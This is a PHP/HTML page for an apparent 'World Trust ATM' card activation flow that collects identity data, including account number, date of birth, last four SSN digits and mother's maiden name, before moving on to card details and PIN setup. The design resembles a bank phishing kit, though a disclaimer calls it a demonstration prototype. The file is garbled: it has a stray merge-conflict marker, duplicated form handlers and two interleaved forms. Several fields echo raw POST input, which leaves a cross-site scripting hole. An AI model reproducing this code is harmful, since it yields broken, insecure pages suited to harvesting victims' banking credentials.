<?php
/**

 * ATM Card Activation - Step 1: Personal & Account Information
=======
 * World Trust ATM - Card Activation
 * Page 1: Basic Details Collection

 */

require_once 'includes/config.php';
require_once 'includes/functions.php';


// Generate CSRF token
$csrf_token = generate_csrf_token();

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Verify CSRF token
    if (!isset($_POST['csrf_token']) || !verify_csrf_token($_POST['csrf_token'])) {
        set_flash('error', 'Invalid security token. Please try again.');
        redirect('index.php');
    }
    
    // Check rate limiting
    $ip = get_client_ip();
    if (check_rate_limit($ip)) {
        set_flash('error', 'Too many requests. Please try again later.');
        redirect('index.php');
    }
    
    // Validate and sanitize input
    $errors = [];
    
    $firstName = sanitize_input($_POST['first_name'] ?? '');
    $lastName = sanitize_input($_POST['last_name'] ?? '');
    $dob = sanitize_input($_POST['dob'] ?? '');
    $email = sanitize_input($_POST['email'] ?? '');
    $phone = sanitize_input($_POST['phone'] ?? '');
    $accountNumber = sanitize_input($_POST['account_number'] ?? '');
    $street = sanitize_input($_POST['street'] ?? '');
    $city = sanitize_input($_POST['city'] ?? '');
    $state = sanitize_input($_POST['state'] ?? '');
    $zip = sanitize_input($_POST['zip'] ?? '');
    $ssnLast4 = sanitize_input($_POST['ssn_last4'] ?? '');
    $maidenName = sanitize_input($_POST['maiden_name'] ?? '');
    
    // Validation
    if (empty($firstName) || strlen($firstName) < 2) {
        $errors[] = 'First name is required and must be at least 2 characters.';
    }
    
    if (empty($lastName) || strlen($lastName) < 2) {
        $errors[] = 'Last name is required and must be at least 2 characters.';
    }
    
    if (!validate_date($dob)) {
        $errors[] = 'Please enter a valid date of birth.';
    }
    
    if (!validate_email($email)) {
        $errors[] = 'Please enter a valid email address.';
    }
    
    if (!validate_phone($phone)) {
        $errors[] = 'Please enter a valid phone number.';
    }
    
    if (empty($accountNumber) || strlen($accountNumber) !== 12 || !ctype_digit($accountNumber)) {
        $errors[] = 'Account number must be exactly 12 digits.';
    }
    
    if (empty($street)) {
        $errors[] = 'Street address is required.';
    }
    
    if (empty($city)) {
        $errors[] = 'City is required.';
    }
    
    if (empty($state)) {
        $errors[] = 'State is required.';
    }
    
    if (empty($zip) || strlen($zip) < 5) {
        $errors[] = 'Valid ZIP code is required.';
    }
    
    if (empty($ssnLast4) || strlen($ssnLast4) !== 4 || !ctype_digit($ssnLast4)) {
        $errors[] = 'Last 4 digits of SSN must be exactly 4 digits.';
    }
    
    if (empty($maidenName)) {
        $errors[] = "Mother's maiden name is required.";
    }
    
    if (empty($errors)) {
        // Store data in session for next step
        $_SESSION['activation_data'] = [
            'first_name' => $firstName,
            'last_name' => $lastName,
            'dob' => $dob,
            'email' => $email,
            'phone' => $phone,
            'account_number' => $accountNumber,
            'street' => $street,
            'city' => $city,
            'state' => $state,
            'zip' => $zip,
            'ssn_last4' => $ssnLast4,
            'maiden_name' => $maidenName,
        ];
        
        redirect('card-display.php');
    } else {
        set_flash('error', implode('<br>', $errors));
    }
}

// Get flash message
$flash = get_flash();

$errors = [];
$form_data = [];

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Sanitize and collect form data
    $form_data = [
        'first_name' => sanitize_input($_POST['first_name'] ?? ''),
        'last_name' => sanitize_input($_POST['last_name'] ?? ''),
        'dob' => sanitize_input($_POST['dob'] ?? ''),
        'email' => sanitize_input($_POST['email'] ?? ''),
        'phone' => sanitize_input($_POST['phone'] ?? ''),
        'account_number' => sanitize_input($_POST['account_number'] ?? ''),
        'street' => sanitize_input($_POST['street'] ?? ''),
        'city' => sanitize_input($_POST['city'] ?? ''),
        'state' => sanitize_input($_POST['state'] ?? ''),
        'zip' => sanitize_input($_POST['zip'] ?? ''),
        'ssn' => sanitize_input($_POST['ssn'] ?? ''),
        'maiden_name' => sanitize_input($_POST['maiden_name'] ?? '')
    ];
    
    // Validation
    if (empty($form_data['first_name'])) {
        $errors['first_name'] = 'First name is required';
    }
    
    if (empty($form_data['last_name'])) {
        $errors['last_name'] = 'Last name is required';
    }
    
    if (empty($form_data['dob'])) {
        $errors['dob'] = 'Date of birth is required';
    }
    
    if (empty($form_data['email'])) {
        $errors['email'] = 'Email is required';
    } elseif (!validate_email($form_data['email'])) {
        $errors['email'] = 'Please enter a valid email address';
    }
    
    if (empty($form_data['phone'])) {
        $errors['phone'] = 'Phone number is required';
    } elseif (!validate_phone($form_data['phone'])) {
        $errors['phone'] = 'Please enter a valid phone number';
    }
    
    if (empty($form_data['account_number'])) {
        $errors['account_number'] = 'Account number is required';
    } elseif (!validate_account($form_data['account_number'])) {
        $errors['account_number'] = 'Account number must be 10-12 digits';
    }
    
    if (empty($form_data['street'])) {
        $errors['street'] = 'Street address is required';
    }
    
    if (empty($form_data['city'])) {
        $errors['city'] = 'City is required';
    }
    
    if (empty($form_data['state'])) {
        $errors['state'] = 'State is required';
    }
    
    if (empty($form_data['zip'])) {
        $errors['zip'] = 'ZIP code is required';
    }
    
    if (empty($form_data['ssn'])) {
        $errors['ssn'] = 'Last 4 digits of SSN required';
    } elseif (!validate_ssn($form_data['ssn'])) {
        $errors['ssn'] = 'Please enter the last 4 digits of your SSN';
    }
    
    if (empty($form_data['maiden_name'])) {
        $errors['maiden_name'] = 'Mother\'s maiden name is required';
    }
    
    // If no errors, save to session and redirect
    if (empty($errors)) {
        $_SESSION['user_data'] = $form_data;
        $_SESSION['last_activity'] = time();
        header('Location: card-display.php');
        exit();
    }
}

// Check for timeout
$timeout_message = '';
if (isset($_GET['timeout'])) {
    $timeout_message = 'Your session has expired. Please start over.';
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Card Activation - Step 1 | <?php echo APP_NAME; ?></title>

    <meta name="description" content="<?php echo APP_NAME; ?> - Activate your ATM card securely">
    <title><?php echo APP_NAME; ?> - Card Activation</title>

    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">

        <div class="header">
            <h1>ATM Card Activation</h1>
            <p>Secure online activation in 3 easy steps</p>
        </div>
        
        <!-- Progress Indicator -->
        <div class="progress-indicator">
            <div class="progress-step active">
                <span class="step-number">1</span>
                <span class="step-label">Personal Info</span>
            </div>
            <div class="progress-step">
                <span class="step-number">2</span>
                <span class="step-label">Card Details</span>
            </div>
            <div class="progress-step">
                <span class="step-number">3</span>
                <span class="step-label">PIN Setup</span>
            </div>
        </div>
        
        <?php if ($flash): ?>
        <div class="alert alert-<?php echo $flash['type']; ?>">
            <?php echo $flash['message']; ?>
        </div>
        <?php endif; ?>
        
        <form id="activationForm" method="POST" action="index.php">
            <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
            
            <h3 style="margin-bottom: 20px; color: var(--primary-color);">Personal Information</h3>
            
            <div class="form-row">
                <div class="form-group">
                    <label for="first_name">First Name <span class="required">*</span></label>
                    <input type="text" id="first_name" name="first_name" class="form-control" 
                           autocomplete="given-name" required
                           value="<?php echo $_POST['first_name'] ?? ''; ?>">
                    <span class="error-message">Please enter your first name</span>
                </div>
                
                <div class="form-group">
                    <label for="last_name">Last Name <span class="required">*</span></label>
                    <input type="text" id="last_name" name="last_name" class="form-control" 
                           autocomplete="family-name" required
                           value="<?php echo $_POST['last_name'] ?? ''; ?>">
                    <span class="error-message">Please enter your last name</span>
                </div>
            </div>
            
            <div class="form-group">
                <label for="dob">Date of Birth <span class="required">*</span></label>
                <input type="date" id="dob" name="dob" class="form-control" 
                       autocomplete="bday" required
                       value="<?php echo $_POST['dob'] ?? ''; ?>">
                <span class="error-message">Please enter your date of birth</span>
            </div>
            
            <div class="form-row">
                <div class="form-group">
                    <label for="email">Email Address <span class="required">*</span></label>
                    <input type="email" id="email" name="email" class="form-control" 
                           autocomplete="email" required
                           value="<?php echo $_POST['email'] ?? ''; ?>">
                    <span class="error-message">Please enter a valid email address</span>
                </div>
                
                <div class="form-group">
                    <label for="phone">Phone Number <span class="required">*</span></label>
                    <input type="tel" id="phone" name="phone" class="form-control" 
                           autocomplete="tel" required
                           placeholder="(123) 456-7890"
                           value="<?php echo $_POST['phone'] ?? ''; ?>">
                    <span class="error-message">Please enter a valid phone number</span>
                </div>
            </div>
            
            <h3 style="margin: 30px 0 20px; color: var(--primary-color);">Account Information</h3>
            
            <div class="form-group">
                <label for="account_number">Account Number <span class="required">*</span></label>
                <input type="text" id="account_number" name="account_number" class="form-control" 
                       autocomplete="off" required maxlength="12"
                       placeholder="12-digit account number"
                       value="<?php echo $_POST['account_number'] ?? ''; ?>">
                <span class="info-text">Enter your 12-digit account number</span>
                <span class="error-message">Account number must be 12 digits</span>
            </div>
            
            <div class="form-group">
                <label for="street">Street Address <span class="required">*</span></label>
                <input type="text" id="street" name="street" class="form-control" 
                       autocomplete="street-address" required
                       value="<?php echo $_POST['street'] ?? ''; ?>">
                <span class="error-message">Please enter your street address</span>
            </div>
            
            <div class="form-row">
                <div class="form-group">
                    <label for="city">City <span class="required">*</span></label>
                    <input type="text" id="city" name="city" class="form-control" 
                           autocomplete="address-level2" required
                           value="<?php echo $_POST['city'] ?? ''; ?>">
                    <span class="error-message">Please enter your city</span>
                </div>
                
                <div class="form-group">
                    <label for="state">State <span class="required">*</span></label>
                    <input type="text" id="state" name="state" class="form-control" 
                           autocomplete="address-level1" required maxlength="2"
                           placeholder="CA"
                           value="<?php echo $_POST['state'] ?? ''; ?>">
                    <span class="error-message">Please enter your state</span>

        <!-- Header -->
        <header class="header">
            <h1 class="logo"><?php echo APP_NAME; ?></h1>
            <p class="tagline"><?php echo APP_TAGLINE; ?></p>
        </header>

        <!-- Form Container -->
        <div class="form-container">
            <h2 class="form-title">Activate Your ATM Card</h2>
            <p class="form-subtitle">Please provide your details to activate your new card</p>
            
            <?php if ($timeout_message): ?>
                <div class="error-message show" style="margin-bottom: 20px;">
                    <?php echo $timeout_message; ?>
                </div>
            <?php endif; ?>
            
            <span class="security-badge">Secure Form</span>
            
            <form id="activationForm" method="POST" action="" novalidate>
                <!-- Personal Information -->
                <div class="form-row">
                    <div class="form-group">
                        <label for="first_name">First Name <span class="required">*</span></label>
                        <input type="text" id="first_name" name="first_name" 
                               value="<?php echo htmlspecialchars($form_data['first_name'] ?? ''); ?>"
                               required aria-required="true">
                        <?php if (isset($errors['first_name'])): ?>
                            <span class="error-message show"><?php echo $errors['first_name']; ?></span>
                        <?php endif; ?>
                    </div>
                    
                    <div class="form-group">
                        <label for="last_name">Last Name <span class="required">*</span></label>
                        <input type="text" id="last_name" name="last_name" 
                               value="<?php echo htmlspecialchars($form_data['last_name'] ?? ''); ?>"
                               required aria-required="true">
                        <?php if (isset($errors['last_name'])): ?>
                            <span class="error-message show"><?php echo $errors['last_name']; ?></span>
                        <?php endif; ?>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="dob">Date of Birth <span class="required">*</span></label>
                    <input type="date" id="dob" name="dob" 
                           value="<?php echo htmlspecialchars($form_data['dob'] ?? ''); ?>"
                           required aria-required="true">
                    <?php if (isset($errors['dob'])): ?>
                        <span class="error-message show"><?php echo $errors['dob']; ?></span>
                    <?php endif; ?>
                </div>
                
                <div class="form-row">
                    <div class="form-group">
                        <label for="email">Email Address <span class="required">*</span></label>
                        <input type="email" id="email" name="email" 
                               value="<?php echo htmlspecialchars($form_data['email'] ?? ''); ?>"
                               required aria-required="true">
                        <?php if (isset($errors['email'])): ?>
                            <span class="error-message show"><?php echo $errors['email']; ?></span>
                        <?php endif; ?>
                    </div>
                    
                    <div class="form-group">
                        <label for="phone">Phone Number <span class="required">*</span></label>
                        <input type="tel" id="phone" name="phone" 
                               value="<?php echo htmlspecialchars($form_data['phone'] ?? ''); ?>"
                               placeholder="+1234567890"
                               required aria-required="true">
                        <?php if (isset($errors['phone'])): ?>
                            <span class="error-message show"><?php echo $errors['phone']; ?></span>
                        <?php endif; ?>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="account_number">Account Number <span class="required">*</span></label>
                    <input type="text" id="account_number" name="account_number" 
                           value="<?php echo htmlspecialchars($form_data['account_number'] ?? ''); ?>"
                           placeholder="10-12 digits"
                           required aria-required="true">
                    <?php if (isset($errors['account_number'])): ?>
                        <span class="error-message show"><?php echo $errors['account_number']; ?></span>
                    <?php endif; ?>
                </div>
                
                <!-- Address -->
                <div class="form-group">
                    <label for="street">Street Address <span class="required">*</span></label>
                    <input type="text" id="street" name="street" 
                           value="<?php echo htmlspecialchars($form_data['street'] ?? ''); ?>"
                           required aria-required="true">
                    <?php if (isset($errors['street'])): ?>
                        <span class="error-message show"><?php echo $errors['street']; ?></span>
                    <?php endif; ?>
                </div>
                
                <div class="form-row">
                    <div class="form-group">
                        <label for="city">City <span class="required">*</span></label>
                        <input type="text" id="city" name="city" 
                               value="<?php echo htmlspecialchars($form_data['city'] ?? ''); ?>"
                               required aria-required="true">
                        <?php if (isset($errors['city'])): ?>
                            <span class="error-message show"><?php echo $errors['city']; ?></span>
                        <?php endif; ?>
                    </div>
                    
                    <div class="form-group">
                        <label for="state">State <span class="required">*</span></label>
                        <input type="text" id="state" name="state" 
                               value="<?php echo htmlspecialchars($form_data['state'] ?? ''); ?>"
                               required aria-required="true">
                        <?php if (isset($errors['state'])): ?>
                            <span class="error-message show"><?php echo $errors['state']; ?></span>
                        <?php endif; ?>
                    </div>

                </div>
                
                <div class="form-group">
                    <label for="zip">ZIP Code <span class="required">*</span></label>

                    <input type="text" id="zip" name="zip" class="form-control" 
                           autocomplete="postal-code" required maxlength="10"
                           placeholder="12345"
                           value="<?php echo $_POST['zip'] ?? ''; ?>">
                    <span class="error-message">Please enter your ZIP code</span>
                </div>
            </div>
            
            <h3 style="margin: 30px 0 20px; color: var(--primary-color);">Security Verification</h3>
            
            <div class="form-row">
                <div class="form-group">
                    <label for="ssn_last4">Last 4 Digits of SSN <span class="required">*</span></label>
                    <input type="text" id="ssn_last4" name="ssn_last4" class="form-control" 
                           autocomplete="off" required maxlength="4"
                           placeholder="1234"
                           value="<?php echo $_POST['ssn_last4'] ?? ''; ?>">
                    <span class="error-message">Please enter last 4 digits of SSN</span>
                </div>
                
                <div class="form-group">
                    <label for="maiden_name">Mother's Maiden Name <span class="required">*</span></label>
                    <input type="text" id="maiden_name" name="maiden_name" class="form-control" 
                           autocomplete="off" required
                           value="<?php echo $_POST['maiden_name'] ?? ''; ?>">
                    <span class="error-message">Please enter mother's maiden name</span>
                </div>
            </div>
            
            <div class="button-group">
                <button type="submit" class="btn btn-primary btn-block">
                    Continue to Card Details →
                </button>
            </div>
        </form>
    </div>
    
    <!-- Loading Spinner -->
    <div class="loading-spinner" id="loadingSpinner">
        <div class="spinner"></div>

                    <input type="text" id="zip" name="zip" 
                           value="<?php echo htmlspecialchars($form_data['zip'] ?? ''); ?>"
                           required aria-required="true">
                    <?php if (isset($errors['zip'])): ?>
                        <span class="error-message show"><?php echo $errors['zip']; ?></span>
                    <?php endif; ?>
                </div>
                
                <!-- Security Information -->
                <div class="form-row">
                    <div class="form-group">
                        <label for="ssn">Last 4 Digits of SSN <span class="required">*</span></label>
                        <input type="password" id="ssn" name="ssn" 
                               value="<?php echo htmlspecialchars($form_data['ssn'] ?? ''); ?>"
                               maxlength="4" placeholder="****"
                               required aria-required="true">
                        <?php if (isset($errors['ssn'])): ?>
                            <span class="error-message show"><?php echo $errors['ssn']; ?></span>
                        <?php endif; ?>
                    </div>
                    
                    <div class="form-group">
                        <label for="maiden_name">Mother's Maiden Name <span class="required">*</span></label>
                        <input type="text" id="maiden_name" name="maiden_name" 
                               value="<?php echo htmlspecialchars($form_data['maiden_name'] ?? ''); ?>"
                               required aria-required="true">
                        <?php if (isset($errors['maiden_name'])): ?>
                            <span class="error-message show"><?php echo $errors['maiden_name']; ?></span>
                        <?php endif; ?>
                    </div>
                </div>
                
                <button type="submit" class="btn btn-primary">Continue to Activation</button>
            </form>
        </div>
        
        <!-- Disclaimer -->
        <div class="disclaimer">
            <div class="disclaimer-title">Security Disclaimer</div>
            <p>This is a demonstration prototype. Real banking applications require backend validation, PCI DSS compliance, HTTPS encryption, secure database storage, and two-factor authentication. Never enter real financial information on demonstration sites.</p>
        </div>

    </div>
    
    <script src="js/form-validation.js"></script>
</body>
</html>
